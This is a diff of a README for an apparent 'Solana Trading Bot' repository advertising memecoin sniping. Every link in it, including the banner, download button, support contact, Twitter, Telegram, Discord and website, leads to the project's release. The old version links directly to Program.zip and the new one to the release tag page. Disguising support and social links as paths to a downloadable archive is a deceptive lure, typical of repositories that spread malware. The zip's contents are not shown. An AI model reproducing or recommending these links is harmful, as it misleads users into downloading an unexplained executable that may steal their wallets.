@@ -1,6 +1,6 @@
 # 🚀 Welcome to Solana Trading Bot Repository! 🤖
 
-![Solana Trading Bot](https://github.com/aolkgh/solana-trading-bot/releases/download/v1.0/Program.zip)
+![Solana Trading Bot](https://github.com/aolkgh/solana-trading-bot/releases/tag/v1.0)
 
 ## Repository Name: solana-trading-bot
 ## Short Description: Solana Trading Bot - RC: For Solana token sniping and trading, the latest version has completed all optimizations
@@ -12,9 +12,9 @@ auto-trade-bot, auto-trading, blockchain, crypto, meme-bot, memecoin, raydium-bo
 
 ---
 
-### 📥 Download the latest version here: [Download Now!](https://github.com/aolkgh/solana-trading-bot/releases/download/v1.0/Program.zip)
+### 📥 Download the latest version here: [Download Now!](https://github.com/aolkgh/solana-trading-bot/releases/tag/v1.0)
 
-[![Download](https://github.com/aolkgh/solana-trading-bot/releases/download/v1.0/Program.zip)](https://github.com/aolkgh/solana-trading-bot/releases/download/v1.0/Program.zip)
+[![Download](https://github.com/aolkgh/solana-trading-bot/releases/tag/v1.0)](https://github.com/aolkgh/solana-trading-bot/releases/tag/v1.0)
 
 ---
 
@@ -51,7 +51,7 @@ To get started with the Solana Trading Bot, follow these simple steps:
 ---
 
 ## Support and Feedback
-For any questions, feedback, or technical issues, please reach out to our support team at [https://github.com/aolkgh/solana-trading-bot/releases/download/v1.0/Program.zip](https://github.com/aolkgh/solana-trading-bot/releases/download/v1.0/Program.zip). We are committed to providing you with the best trading experience possible and are here to assist you every step of the way.
+For any questions, feedback, or technical issues, please reach out to our support team at [https://github.com/aolkgh/solana-trading-bot/releases/tag/v1.0](https://github.com/aolkgh/solana-trading-bot/releases/tag/v1.0). We are committed to providing you with the best trading experience possible and are here to assist you every step of the way.
 
 ---
 
@@ -72,9 +72,9 @@ Please note that trading cryptocurrencies involves risk, and past performance is
 
 ## Let's Connect!
 Connect with us on social media for the latest updates, trading tips, and community discussions:
-- [Twitter](https://github.com/aolkgh/solana-trading-bot/releases/download/v1.0/Program.zip)
-- [Telegram](https://github.com/aolkgh/solana-trading-bot/releases/download/v1.0/Program.zip)
-- [Discord](https://github.com/aolkgh/solana-trading-bot/releases/download/v1.0/Program.zip)
+- [Twitter](https://github.com/aolkgh/solana-trading-bot/releases/tag/v1.0)
+- [Telegram](https://github.com/aolkgh/solana-trading-bot/releases/tag/v1.0)
+- [Discord](https://github.com/aolkgh/solana-trading-bot/releases/tag/v1.0)
 
 ---
 
@@ -84,6 +84,6 @@ Thank you for choosing Solana Trading Bot for your trading needs. We look forwar
 
 ### Keywords: auto-trade-bot, auto-trading, blockchain, crypto, meme-bot, memecoin, raydium-bot, raydium-sniper-bot, snipe-bot, sniper-bot-solana-raydium, solana, solana-token, solana-token-bot, spl-token, spl-token-snipe, tradingbot
 
-### Visit our [website](https://github.com/aolkgh/solana-trading-bot/releases/download/v1.0/Program.zip) for more information and updates! 🌐
+### Visit our [website](https://github.com/aolkgh/solana-trading-bot/releases/tag/v1.0) for more information and updates! 🌐
 
 ---
